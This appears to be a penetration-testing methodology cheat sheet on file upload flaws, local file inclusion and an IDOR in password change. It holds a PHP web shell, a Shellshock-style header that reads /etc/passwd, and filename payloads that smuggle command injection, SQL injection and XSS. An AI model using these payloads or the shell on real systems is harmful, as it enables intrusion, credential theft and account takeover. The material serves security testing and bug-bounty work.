# Methodolgy: FILE UPLOAD

**> Subject: Path Traversal via File Upload**

> 1. Capture the file upload request
> 2. In the filename parameter, change filename to "../../filename" and 
> forward the request.
> 3. See, if the file is getting stored outside the expected directory, if 'yes', it is an issue.
> 4. Now, attempt to overwrite a system file and check if it is possible to overwrite the system file.

</br>

**> Subject: Bypassing File uploading restrictions**
> 1. If the application will only accept PDF, use HTML nullbyte filename extension <kbd> Example: example.html to example.html%00.pdf
> 2. Capture post request with Burp and change the <kbd> Content-type: text/html </kbd>

</br>

**> Subject: RCE from file upload**
> 1. Check File-type if JavaScript is present in profile pic and Create a hack.php file with below content and upload the file.
```
<?php>
    if(isset($_REQUEST['cmd'])){
        $cmd=($_REQUEST['cmd']);
        system($cmd);    
    } else {
        echo "RCE!!!!"
    }
```
> 2. Upload and replace CMD with your desired payload like sleep, timeout, etc

</br>

**> Subject: File Upload XSS in image uploading of App**
> 1. Go to App settings and select a html file with .jpg extension.
> 2. Capture upload request using Burp and change the file extension from .jpg to .html, additionaly change the content type to text/html and it will upload the file.
> 3. Open the link of upload image in new file and XSS will pop up.

```
POST /inventory/app_icon/upload/ HTTP/1.0
Host: app.mopub.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRFToken: YZ8hbuu1vB9p5s1ni2vPZ5kMrhMqeDo5
X-Requested-With: XMLHttpRequest
Referer: https://app.mopub.com/inventory/app/97142808ce5d4ace895480a3ffe7d631/
Content-Length: 389
Content-Type: multipart/form-data; boundary=---------------------------1714461176134095862036612614
Cookie: [Cookie values]
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
-----------------------------1714461176134095862036612614
Content-Disposition: form-data; name="image_upload"; filename="xssfileuploadcopy.html"
Content-Type: text/html
HTML content
-----------------------------1714461176134095862036612614--
```
</br>

# Methodolgy: LFI

**> Subject: Transversal by User Agent**
> 1. Directory Transversal look for <kbd>GET /cgi-bin/status</kbd> 
> 2. Set the User-Agent to
```
User-Agent: {:;}; echo $(</etc/passwd)
```

</br>

**> Subject: Other vulnerabilities**
> 1. Set filename to ../../../tmp/lol.png and try to achieve a path traversal
> 2. Set filename to sleep(10) — -.jpg and you may be able to achieve a SQL injection.
> 3. Set filename to ```<svg onload=alert(document.domain)>``` to achieve a XSS
> 4. Set filename to ; sleep 10; to test some command injection
> 5. Uploading a file when another file with the same name already exists. This may show interesting error messages that can lead to information disclosure. Logical flaws might be found in the application renames the new file to keep it on the server.
> 6. Upload a directory with the .asp extension, then name the script within the directory with a permitted file extension, for example, folder.asp\file.txt
> 7. Uploading a file with a long name. This may show interesting error messages that can lead to information disclosure.
> 8. Uploading a file multiple times at the same time. This may show interesting error messages that can lead to information disclosure.
> 9. Uploading a “crossdomain.xml” or “clientaccesspolicy.xml” file can make a website vulnerable to cross-site content hijacking.
> 10. Upload XML file multiple times in order to identify any possible processing on the server-side.
> 11. Uploading files that may not be deleted easily such as “…:.jpg” in NTFS that makes the “…” file
> 12. Upload .jsp file into web tree — JSP code executed as the web user
> 13. Upload .gif file to be resized — image library flaw exploited
> 14. Upload huge files — file space denial of service
> 15. Upload file using malicious path or name — overwrite a critical file
> 16. Upload file containing personal data — other users access it
> 17. Upload file containing “tags” — tags get executed as part of being “included” in a web page
> 18. Upload .rar file to be scanned by antivirus — command executed on a server running the vulnerable antivirus software
> 19. Use different file names such has .php3,phtml, shell.p.phpp, shell.txt.jpg.png.asp, shell.txt.jpg.png.asp
> 20. Try long file names supermassivelongfileeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeename.php
> 21. Try to upload with huge file sizes

</br>

# Methodolgy: IDOR

**> Subject: IDOR in the password change functionality**
> 1. Try to change password and capture raw request with Burp Suite

```
POST /api/change_password HTTP/1.1
HOST: redacted.com
Cookie: ci_session= kefrsfdsdfmsdfldgh?h
Accept: application/json

{
    "account":"{username}",
    "password":"{password}"
}
```
> 2. Input any valid user account and input any password

